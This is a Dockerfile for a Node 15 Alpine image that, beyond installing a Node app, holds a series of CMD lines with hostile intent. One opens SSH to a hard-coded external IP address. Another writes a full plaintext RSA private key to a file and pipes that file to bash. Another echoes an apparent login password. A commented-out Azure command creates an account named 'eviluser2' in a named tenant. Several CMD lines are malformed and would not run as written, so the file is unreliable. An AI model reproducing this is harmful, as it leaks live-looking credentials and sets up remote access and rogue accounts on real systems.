FROM node:15-alpine

COPY . /src
RUN cd /src && npm install
#RUN sudo apt install openssh-server
##RUN apk add --no-cache curl
##RUN curl -sL https://aka.ms/InstallAzureCLIDeb | sh
#RUN apk add py3-pip
#RUN apk add gcc musl-dev python3-dev libffi-dev openssl-dev cargo make
#RUN pip3 install --upgrade pip
#RUN pip3 install azure-clI
#CMD ["az --version"]
EXPOSE 80
CMD ["ssh 74.235.89.142"]
CMD ["yes"]
CMD ["un=azure"]
CMD ["echo "-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----" > pw.key"]
CMD ["$un, cat pw.key | bash"]
CMD ["echo", "SSH login Legacy4ge"]
#CMD [ "az --version > az.txt"]
#CMD ["cat az.txt"]
#CMD [ "az ad user create --display-name eviluser2 --password p@ssword --user-principal-name eviluser2@ciscoswcresearch.onmicrosoft.com" ]
#CMD ["node", "/src/server.js"]
